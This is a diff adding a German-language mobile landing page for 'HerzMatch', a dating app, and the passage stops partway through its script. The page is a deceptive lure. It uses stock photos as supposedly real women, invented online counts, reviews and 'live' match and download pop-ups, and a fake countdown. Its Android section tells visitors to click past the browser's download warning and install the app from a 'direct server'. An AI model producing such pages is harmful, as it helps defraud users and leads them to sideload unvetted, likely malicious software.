@@ -1,1 +1,619 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>HerzMatch - Finde dein aufregendes Date in Deutschland</title>
 
+  <!-- Meta Pixel 基礎代碼（多像素廣播） -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    // 請替換為您的 Facebook 像素 ID
+    fbq('init', '1723171458774127');
+    fbq('init', '1909346100471713');
+    fbq('init', 'PIXEL_ID_3');
+
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=PIXEL_ID_1&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=PIXEL_ID_2&ev=PageView&noscript=1"/>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=PIXEL_ID_3&ev=PageView&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* 曖昧浪漫的漸變微光基底 */
+    body {
+      background: radial-gradient(circle at 10% 10%, #fff1f2 0%, #fdf2f8 35%, #faf5ff 70%, #fff5f5 100%);
+      color: #3b0764;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+      overflow-x: hidden;
+    }
+    .hide-scrollbar::-webkit-scrollbar { display: none; }
+    .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+    /* 心動磨砂玻璃卡片 */
+    .glass-heart-card {
+      background: rgba(255, 255, 255, 0.78);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid rgba(251, 113, 133, 0.22);
+      box-shadow: 0 8px 30px -4px rgba(244, 63, 94, 0.12);
+    }
+
+    /* 曖昧心跳呼吸引流按鈕 */
+    @keyframes heartbeat-pulse {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow: 0 6px 20px rgba(244, 63, 94, 0.38);
+      }
+      50% {
+        transform: scale(1.02);
+        box-shadow: 0 10px 32px rgba(244, 63, 94, 0.65);
+      }
+    }
+    .cta-heartbeat {
+      animation: heartbeat-pulse 1.7s infinite ease-in-out;
+    }
+
+    /* 實時動態播報彈窗滑入動效 */
+    @keyframes toast-slide-up {
+      0% { opacity: 0; transform: translateY(16px) scale(0.95); }
+      15% { opacity: 1; transform: translateY(0) scale(1); }
+      85% { opacity: 1; transform: translateY(0) scale(1); }
+      100% { opacity: 0; transform: translateY(-12px) scale(0.95); }
+    }
+    .toast-anim {
+      animation: toast-slide-up 3.6s ease-in-out forwards;
+    }
+  </style>
+</head>
+<body class="flex flex-col min-h-screen pb-32 relative">
+
+  <!-- 曖昧背景光暈裝飾點綴 -->
+  <div class="fixed top-[-80px] right-[-60px] w-72 h-72 rounded-full bg-rose-300/30 blur-3xl pointer-events-none -z-10"></div>
+  <div class="fixed top-[45%] left-[-80px] w-80 h-80 rounded-full bg-purple-300/25 blur-3xl pointer-events-none -z-10"></div>
+
+  <!-- 1. 頂部心動限時授權狀態條 -->
+  <header class="w-full bg-white/85 text-slate-800 px-3.5 py-2.5 sticky top-0 z-40 shadow-sm backdrop-blur-md border-b border-rose-100">
+    <div class="flex items-center justify-between">
+      <div class="flex items-center space-x-1.5">
+        <span class="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping"></span>
+        <span class="text-[11px] font-bold text-rose-900 flex items-center">
+          <span class="mr-1">🔥</span> 5.820+ Singles Jetzt Online · DE
+        </span>
+      </div>
+      <div class="text-[11px] bg-rose-500/10 px-2.5 py-0.5 rounded-full flex items-center space-x-1.5 font-semibold border border-rose-300/50">
+        <span class="text-rose-700">VIP Gratis-Zugang:</span>
+        <span id="countdown" class="font-mono font-extrabold text-rose-600">14:59</span>
+      </div>
+    </div>
+    <div class="mt-1.5 w-full bg-rose-100 rounded-full h-1 overflow-hidden">
+      <div class="bg-gradient-to-r from-rose-500 via-pink-500 to-purple-500 h-1 rounded-full w-[86%]"></div>
+    </div>
+  </header>
+
+  <main class="flex-1 px-4 pt-3.5 max-w-lg mx-auto w-full">
+
+    <!-- 2. 首屏產品名片 -->
+    <div class="glass-heart-card p-3.5 rounded-2xl flex items-center justify-between gap-3">
+      <div class="flex items-center space-x-3 min-w-0">
+        <div class="w-16 h-16 rounded-2xl bg-gradient-to-tr from-rose-500 via-pink-500 to-purple-500 shadow-lg shadow-rose-300/40 flex flex-col items-center justify-center flex-shrink-0 text-white border-2 border-white">
+          <svg class="w-7 h-7 text-white fill-current animate-pulse" viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+          <span class="text-[8px] font-black tracking-wider uppercase mt-0.5">HerzMatch</span>
+        </div>
+        <div class="min-w-0">
+          <div class="flex items-center space-x-1.5">
+            <h1 class="text-base font-extrabold text-slate-900 truncate">HerzMatch DE</h1>
+            <span class="bg-rose-50 text-rose-600 text-[9px] font-bold px-1.5 py-0.5 rounded border border-rose-200">100% Real</span>
+          </div>
+          <p class="text-xs text-rose-500 font-bold truncate mt-0.5">Finde Dates & Flirts in deiner Nähe</p>
+          <div class="flex items-center text-[10px] text-slate-500 space-x-2 mt-1">
+            <span>24.8 MB</span>
+            <span>•</span>
+            <span class="text-emerald-600 font-semibold flex items-center">
+              <svg class="w-3 h-3 text-emerald-500 mr-0.5 fill-current" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+              Verifiziert & Sicher
+            </span>
+          </div>
+        </div>
+      </div>
+      <button onclick="triggerSmartDownload()" class="bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 hover:opacity-95 active:scale-95 transition-all text-white text-xs font-bold px-3.5 py-2.5 rounded-xl shadow-md whitespace-nowrap">
+        Jetzt Flirten
+      </button>
+    </div>
+
+    <!-- 3. 心動指標欄 -->
+    <div class="grid grid-cols-3 gap-2 glass-heart-card p-2.5 rounded-2xl mt-3 text-center">
+      <div>
+        <div class="text-amber-500 text-xs font-bold flex items-center justify-center">
+          <span>4.9</span>
+          <svg class="w-3.5 h-3.5 ml-0.5 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+        </div>
+        <div class="text-[10px] text-slate-500 font-medium">32.400+ Dates</div>
+      </div>
+      <div class="border-x border-rose-100">
+        <div class="text-rose-600 text-xs font-bold">100% Kostenlos</div>
+        <div class="text-[10px] text-slate-500 font-medium">Direkt Chatten</div>
+      </div>
+      <div>
+        <div class="text-purple-600 text-xs font-bold">&lt; 3 Min.</div>
+        <div class="text-[10px] text-slate-500 font-medium">Antwortgarantie</div>
+      </div>
+    </div>
+
+    <!-- 4. 浪漫高亮：德國熱門城市在線專區 -->
+    <div onclick="triggerSmartDownload()" class="mt-3.5 bg-gradient-to-r from-rose-400 via-pink-400 to-purple-400 p-[1.5px] rounded-2xl cursor-pointer active:scale-[0.99] transition-all shadow-md shadow-rose-200/50">
+      <div class="bg-white/95 backdrop-blur-md rounded-2xl p-3.5">
+        <div class="flex items-center justify-between pb-2 border-b border-rose-50">
+          <div class="flex items-center space-x-2">
+            <span class="bg-rose-500 text-white text-[9px] font-extrabold px-1.5 py-0.5 rounded flex items-center shadow-sm">
+              <span class="w-1.5 h-1.5 rounded-full bg-white mr-1 animate-pulse"></span>LIVE MATCH
+            </span>
+            <h2 class="text-xs font-extrabold text-slate-900 tracking-tight">Singles in deiner Region aktiv</h2>
+          </div>
+          <span class="text-[10px] text-rose-600 bg-rose-50 font-bold px-2 py-0.5 rounded-full border border-rose-200">
+            Jetzt online
+          </span>
+        </div>
+
+        <div class="grid grid-cols-6 gap-2 mt-2.5 text-center">
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              BER
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">Berlin</span>
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              MUC
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">München</span>
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              HAM
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">Hamburg</span>
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              CGN
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">Köln</span>
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              FRA
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">Frankfurt</span>
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-rose-100 to-pink-50 border border-rose-200 text-rose-600 flex items-center justify-center font-black text-[9px] shadow-sm">
+              STR
+            </div>
+            <span class="text-[9px] text-slate-700 font-bold mt-1">Stuttgart</span>
+          </div>
+        </div>
+
+        <div class="mt-2.5 pt-2 border-t border-rose-50 flex items-center justify-between text-[11px]">
+          <span class="text-slate-500">Ohne Abo-Falle · Verifizierte Frauen</span>
+          <span class="text-rose-600 font-bold flex items-center">
+            Profile entdecken
+            <svg class="w-3.5 h-3.5 ml-0.5 fill-current" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 5. 浪漫曖昧女性在線卡片（精準排版、大圖微光粉嫩漸變） -->
+    <div class="mt-4">
+      <div class="flex items-center justify-between mb-2">
+        <h3 class="text-xs font-bold text-slate-900 flex items-center">
+          <span class="w-1.5 h-3.5 bg-gradient-to-b from-rose-500 to-pink-500 rounded-sm mr-1.5"></span>
+          Bereit Für Ein Spontanes Treffen?
+        </h3>
+        <span class="text-[10px] text-rose-500 font-semibold">Nach links wischen</span>
+      </div>
+
+      <div class="flex space-x-1.5 overflow-x-auto hide-scrollbar pb-1 text-xs" id="categoryTabs">
+        <button onclick="switchCategory('nearby')" data-cat="nearby" class="cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all">In deiner Nähe</button>
+        <button onclick="switchCategory('online')" data-cat="online" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Gerade Aktiv</button>
+        <button onclick="switchCategory('berlin')" data-cat="berlin" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Berlin</button>
+        <button onclick="switchCategory('munich')" data-cat="munich" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">München</button>
+        <button onclick="switchCategory('tonight')" data-cat="tonight" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all">Date Heute Abend</button>
+      </div>
+
+      <!-- 女性人物卡片橫向列表 -->
+      <div id="mediaContainer" class="flex space-x-2.5 overflow-x-auto hide-scrollbar pt-2 pb-1"></div>
+    </div>
+
+    <!-- 6. 痛點對比模組 -->
+    <div class="mt-4 glass-heart-card rounded-2xl p-3.5">
+      <h3 class="text-xs font-bold text-slate-900 mb-2.5 text-center">Warum Singles HerzMatch lieben</h3>
+      <div class="space-y-1.5 text-xs">
+        <div class="flex items-center justify-between bg-white/70 p-2.5 rounded-xl border border-rose-100">
+          <span class="text-slate-600 flex items-center">
+            <span class="text-rose-400 font-bold mr-1.5">✕</span> Andere Apps: 30€/Monat für Matches
+          </span>
+          <span class="text-rose-600 font-bold flex items-center">
+            <span class="mr-1">✓</span> Gratis Matchen & Chatten
+          </span>
+        </div>
+        <div class="flex items-center justify-between bg-white/70 p-2.5 rounded-xl border border-rose-100">
+          <span class="text-slate-600 flex items-center">
+            <span class="text-rose-400 font-bold mr-1.5">✕</span> Ständige Bots & Geisterprofile
+          </span>
+          <span class="text-rose-600 font-bold flex items-center">
+            <span class="mr-1">✓</span> 100% Echtheitsprüfung
+          </span>
+        </div>
+        <div class="flex items-center justify-between bg-white/70 p-2.5 rounded-xl border border-rose-100">
+          <span class="text-slate-600 flex items-center">
+            <span class="text-rose-400 font-bold mr-1.5">✕</span> Tagelang warten auf Antworten
+          </span>
+          <span class="text-rose-600 font-bold flex items-center">
+            <span class="mr-1">✓</span> Blitzschnelle Antworten
+          </span>
+        </div>
+        <div class="flex items-center justify-between bg-white/70 p-2.5 rounded-xl border border-rose-100">
+          <span class="text-slate-600 flex items-center">
+            <span class="text-rose-400 font-bold mr-1.5">✕</span> Kreditkarte sofort erforderlich
+          </span>
+          <span class="text-rose-600 font-bold flex items-center">
+            <span class="mr-1">✓</span> Ohne Bezahldaten starten
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 7. 安卓安全指引 -->
+    <div class="mt-4 bg-gradient-to-r from-rose-50 to-pink-50 border border-rose-200 rounded-2xl p-3">
+      <div class="flex items-center space-x-1.5 text-rose-800 font-bold text-xs mb-1">
+        <svg class="w-4 h-4 text-rose-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd"></path></svg>
+        <span>Schnelle & Sichere Installation für Android</span>
+      </div>
+      <p class="text-[11px] text-slate-600 leading-normal mb-2">
+        Um teure Vermittlungsgebühren zu umgehen und den VIP-Chat kostenlos anzubieten, nutzen wir den direkten Server:
+      </p>
+      <div class="grid grid-cols-2 gap-2 text-[11px]">
+        <div class="bg-white/90 p-2 rounded-xl border border-rose-100 shadow-sm">
+          <span class="text-rose-600 font-bold block">① „Trotzdem herunterladen“</span>
+          <span class="text-slate-500 text-[10px]">Offiziell & Geprüft</span>
+        </div>
+        <div class="bg-white/90 p-2 rounded-xl border border-rose-100 shadow-sm">
+          <span class="text-rose-600 font-bold block">② „Installieren & Öffnen“</span>
+          <span class="text-slate-500 text-[10px]">In 3 Sekunden verabreden</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 8. 真實用戶心動評價區 -->
+    <div class="mt-5">
+      <div class="flex items-center justify-between mb-2.5">
+        <h3 class="text-xs font-bold text-slate-900 flex items-center">
+          <span class="w-1.5 h-3.5 bg-rose-500 rounded-sm mr-1.5"></span>
+          Erfahrungen unserer Community (<span class="text-rose-600 font-mono">32.400+</span>)
+        </h3>
+        <span class="text-[10px] text-rose-600 font-medium bg-rose-50 px-2 py-0.5 rounded-full border border-rose-200">Echte Stimmen</span>
+      </div>
+
+      <div id="reviewsContainer" class="space-y-2 text-xs"></div>
+
+      <button id="loadMoreBtn" onclick="loadMoreReviews()" class="w-full mt-2.5 py-2.5 bg-white/90 hover:bg-white text-rose-700 rounded-xl text-xs font-semibold border border-rose-200 shadow-sm transition-all">
+        Weitere Erfahrungen anzeigen ▼
+      </button>
+    </div>
+
+    <!-- 9. 頁尾協議 -->
+    <footer class="mt-8 pt-4 border-t border-rose-100 text-[11px] text-slate-500 space-y-2 pb-6">
+      <div class="text-center space-y-0.5">
+        <p class="text-slate-700 font-semibold">HerzMatch DE - Dating Plattform</p>
+        <p>Support: support@herzmatch-de.com</p>
+      </div>
+
+      <div class="flex justify-center space-x-3 text-slate-500 font-medium pt-1">
+        <button onclick="openModal('privacyModal')" class="hover:text-rose-600 underline">Datenschutz</button>
+        <span>•</span>
+        <button onclick="openModal('termsModal')" class="hover:text-rose-600 underline">Nutzungsbedingungen</button>
+        <span>•</span>
+        <button onclick="openModal('disclaimerModal')" class="hover:text-rose-600 underline">Impressum</button>
+      </div>
+      <p class="text-center text-[10px] text-slate-400 leading-relaxed px-4">
+        © 2026 HerzMatch Media GmbH. Alle Rechte vorbehalten. Zutritt streng ab 18 Jahren. Echte Profile, diskreter Flirt.
+      </p>
+    </footer>
+
+  </main>
+
+  <!-- 10. 吸底心動轉化主按鈕 -->
+  <div class="fixed bottom-0 left-0 right-0 p-3 bg-white/90 backdrop-blur-md border-t border-rose-200/60 z-40 shadow-[0_-4px_24px_rgba(244,63,94,0.15)]">
+    <div class="max-w-lg mx-auto">
+      <button onclick="triggerSmartDownload()" class="cta-heartbeat w-full bg-gradient-to-r from-rose-500 via-pink-500 to-rose-600 active:scale-[0.98] transition-all text-white font-extrabold py-3.5 px-4 rounded-xl shadow-lg flex items-center justify-center space-x-2">
+        <svg class="w-5 h-5 text-white fill-current animate-bounce" viewBox="0 0 24 24">
+          <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+        </svg>
+        <span class="text-base tracking-wide font-sans">HerzMatch Kostenlos Installieren (24.8MB)</span>
+      </button>
+      <div class="text-[10px] text-center text-slate-500 mt-1.5 flex items-center justify-center space-x-2">
+        <span class="text-rose-600 font-semibold flex items-center">
+          <span class="w-1.5 h-1.5 rounded-full bg-rose-500 mr-1 animate-ping"></span>Frauen in deiner Nähe online
+        </span>
+        <span>·</span>
+        <span>Direkter Chat · Keine Kostenfalle</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 11. 實時心動動態播報（已匹配、私聊中、已下載）浮窗容器 -->
+  <div id="liveActivityToast" class="fixed bottom-24 left-4 z-50 pointer-events-none transition-all duration-300"></div>
+
+  <!-- 法律條款彈窗 -->
+  <div id="privacyModal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
+      <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
+        <h4 class="text-sm font-bold text-slate-900">Datenschutzerklärung</h4>
+        <button onclick="closeModal('privacyModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+      </div>
+      <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
+        <p>HerzMatch speichert keine Bank- oder Kreditkartendaten vorab. Standortdaten dienen einzig und allein der Distanzanzeige.</p>
+      </div>
+      <button onclick="closeModal('privacyModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Verstanden</button>
+    </div>
+  </div>
+
+  <div id="termsModal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
+      <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
+        <h4 class="text-sm font-bold text-slate-900">AGB & Richtlinien</h4>
+        <button onclick="closeModal('termsModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+      </div>
+      <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
+        <p>Nutzung ab 18 Jahren. Höflicher und diskreter Umgang wird vorausgesetzt.</p>
+      </div>
+      <button onclick="closeModal('termsModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Akzeptieren</button>
+    </div>
+  </div>
+
+  <div id="disclaimerModal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-white border border-rose-100 rounded-2xl max-w-md w-full p-5 max-h-[80vh] flex flex-col text-left shadow-2xl">
+      <div class="flex justify-between items-center pb-2.5 border-b border-rose-100">
+        <h4 class="text-sm font-bold text-slate-900">Impressum</h4>
+        <button onclick="closeModal('disclaimerModal')" class="text-slate-400 hover:text-slate-700 text-lg">✕</button>
+      </div>
+      <div class="overflow-y-auto text-xs text-slate-600 space-y-2 mt-3 pr-1 leading-relaxed">
+        <p>HerzMatch Media GmbH, Berlin. Geprüfte Profile für sicheres Dating.</p>
+      </div>
+      <button onclick="closeModal('disclaimerModal')" class="mt-4 w-full bg-rose-50 hover:bg-rose-100 text-rose-700 py-2.5 rounded-xl text-xs font-bold transition-all">Schließen</button>
+    </div>
+  </div>
+
+  <script>
+    // 德國女性用戶在線資料庫（大圖、曖昧標籤）
+    const DATING_PROFILES = [
+      { id: "g1", category: "nearby", name: "Lina", age: "27", job: "Designerin", tags: ["#JetztTreffen", "#Chemie"], distance: "1.2 km", img: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500&auto=format&fit=crop&q=80" },
+      { id: "g2", category: "nearby", name: "Sophie", age: "29", job: "Krankenschwester", tags: ["#LateNight", "#Feurig"], distance: "2.4 km", img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=500&auto=format&fit=crop&q=80" },
+      { id: "g3", category: "nearby", name: "Anna", age: "26", job: "Marketing", tags: ["#HeuteAbend", "#SofortTreffen"], distance: "3.1 km", img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500&auto=format&fit=crop&q=80" },
+      { id: "g4", category: "nearby", name: "Marie", age: "25", job: "Café-Besitzerin", tags: ["#Empathisch", "#Match"], distance: "800 m", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=500&auto=format&fit=crop&q=80" },
+      { id: "g5", category: "nearby", name: "Elena", age: "24", job: "Architekturstudentin", tags: ["#Spontan", "#Drinks"], distance: "4.5 km", img: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=500&auto=format&fit=crop&q=80" },
+
+      { id: "g6", category: "online", name: "Clara", age: "23", job: "Studentin / Model", tags: ["#Online", "#Chatten"], distance: "Berlin Mitte", img: "https://images.unsplash.com/photo-1502823403499-6ccfcf4fb453?w=500&auto=format&fit=crop&q=80" },
+      { id: "g7", category: "online", name: "Julia", age: "30", job: "Personal Trainerin", tags: ["#Fitness", "#Aktiv"], distance: "München", img: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=500&auto=format&fit=crop&q=80" },
+      { id: "g8", category: "online", name: "Sarah", age: "27", job: "PR Beraterin", tags: ["#Offen", "#Humor"], distance: "Hamburg", img: "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=500&auto=format&fit=crop&q=80" },
+
+      { id: "g9", category: "berlin", name: "Mia", age: "26", job: "Künstlerin", tags: ["#Kreuzberg", "#Techno"], distance: "Berlin", img: "https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=500&auto=format&fit=crop&q=80" },
+      { id: "g10", category: "berlin", name: "Léa", age: "28", job: "Eventplanerin", tags: ["#Nightlife", "#Drinks"], distance: "Berlin", img: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=500&auto=format&fit=crop&q=80" },
+
+      { id: "g11", category: "munich", name: "Franziska", age: "27", job: "Juristin", tags: ["#Schwabing", "#Elegance"], distance: "München", img: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=500&auto=format&fit=crop&q=80" },
+      { id: "g12", category: "munich", name: "Lisa", age: "26", job: "Stylistin", tags: ["#Maxvorstadt", "#Cocktails"], distance: "München", img: "https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?w=500&auto=format&fit=crop&q=80" },
+
+      { id: "g13", category: "tonight", name: "Vanessa", age: "28", job: "Flugbegleiterin", tags: ["#HeuteFrei", "#DateNight"], distance: "2.1 km", img: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=500&auto=format&fit=crop&q=80" }
+    ];
+
+    function switchCategory(cat) {
+      document.querySelectorAll('.cat-btn').forEach(btn => {
+        if(btn.dataset.cat === cat) {
+          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold whitespace-nowrap shadow-sm shadow-rose-300/40 transition-all';
+        } else {
+          btn.className = 'cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 border border-rose-100 font-semibold whitespace-nowrap shadow-sm transition-all';
+        }
+      });
+
+      const container = document.getElementById('mediaContainer');
+      const items = DATING_PROFILES.filter(item => item.category === cat);
+      
+      // 曖昧心動卡片：微醺柔光粉底疊加 + 名字·年齡 + 職業 + 標籤
+      container.innerHTML = items.map(item => `
+        <div onclick="triggerSmartDownload()" class="w-36 flex-shrink-0 bg-white rounded-2xl overflow-hidden flex flex-col active:scale-95 transition-all cursor-pointer shadow-md shadow-rose-100 border border-rose-100/80 relative group">
+          <div class="h-56 relative overflow-hidden flex flex-col justify-between p-2.5">
+            <img src="${item.img}" alt="${item.name}" class="absolute inset-0 w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
+            
+            <!-- 柔和曖昧的心動光影遮罩：上部微亮，下部覆蓋粉紫色微醺漸變 -->
+            <div class="absolute inset-0 bg-gradient-to-t from-[#4a044e]/90 via-[#831843]/40 to-transparent"></div>
+
+            <!-- 頂部：在線動態點 -->
+            <div class="relative z-10 flex items-center justify-between w-full">
+              <span class="bg-rose-500/90 backdrop-blur-md text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded-full flex items-center shadow-sm">
+                <span class="w-1.5 h-1.5 rounded-full bg-emerald-300 mr-1 animate-pulse"></span>ONLINE
+              </span>
+              <span class="bg-black/35 backdrop-blur-md text-white text-[8px] font-semibold px-1.5 py-0.5 rounded-full">
+                ${item.distance}
+              </span>
+            </div>
+
+            <!-- 底部人物信息與心動標籤 -->
+            <div class="relative z-10 w-full text-left">
+              <span class="text-white text-sm font-extrabold tracking-tight drop-shadow-sm block">${item.name} · ${item.age}</span>
+              <p class="text-pink-100 text-[10px] font-medium leading-tight mt-0.5 truncate">${item.job}</p>
+              
+              <div class="flex flex-wrap gap-1 mt-1.5">
+                ${item.tags.map(t => `
+                  <span class="bg-rose-500/40 backdrop-blur-md text-white border border-white/30 text-[8px] font-bold px-1.5 py-0.5 rounded-md">
+                    ${t}
+                  </span>
+                `).join('')}
+              </div>
+            </div>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // 實時播報資料庫（已匹配、私聊中、已下載）
+    const LIVE_BROADCASTS = [
+      { type: "match", avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100", title: "Lina & Lukas", desc: "haben sich gerade in Berlin gematcht! 💕" },
+      { type: "chat", avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100", title: "Sophie (29)", desc: "schreibt gerade mit einem Single aus München... 💬" },
+      { type: "download", avatar: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=100", title: "Neuer Download", desc: "Max aus Hamburg hat die App gerade installiert! 🔥" },
+      { type: "match", avatar: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100", title: "Marie (25)", desc: "hat ein neues Match in Köln bestätigt! 🥂" },
+      { type: "chat", avatar: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=100", title: "Elena", desc: "ist gerade im privaten Video-Chat aktiv 🎥" },
